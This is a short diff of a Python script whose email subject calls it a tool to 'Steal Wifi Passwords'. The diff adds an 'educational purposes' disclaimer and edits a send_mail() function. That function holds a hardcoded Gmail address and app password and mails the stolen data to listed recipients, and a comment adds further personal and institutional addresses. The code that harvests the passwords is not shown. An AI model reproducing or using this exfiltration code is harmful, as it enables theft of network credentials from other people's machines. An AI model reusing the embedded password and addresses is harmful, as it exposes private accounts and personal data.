@@ -1,3 +1,9 @@
+# Made from scratch by Gibraan Jafar
+# ===== DISCLAIMER ========
+# Only for educational purposes .
+# Use it only at your own risk .
+# The author is not responsible for your actions
+
 import os
 import re
 import subprocess
@@ -90,7 +96,7 @@ def send_mail():
     EMAIL_ADDRESS = "fedivb.viit@gmail.com"  # os.environ.get('EMAIL_USER')
     EMAIL_PASSWORD = "nghglptzoqtnjjur"  # os.environ.get('EMAIL_PASS')
 
-    contacts = ["atharvadare@gmail.com" , "refruta007@gmail.com"]
+    contacts = ["atharvadare@gmail.com" , "refruta007@gmail.com" ] #, "vaishali.mishra@viit.ac.in" , "fatima.inamdar@viit.ac.in"]
 
     msg = EmailMessage()
     msg['Subject'] = "Steal Wifi Passwords"
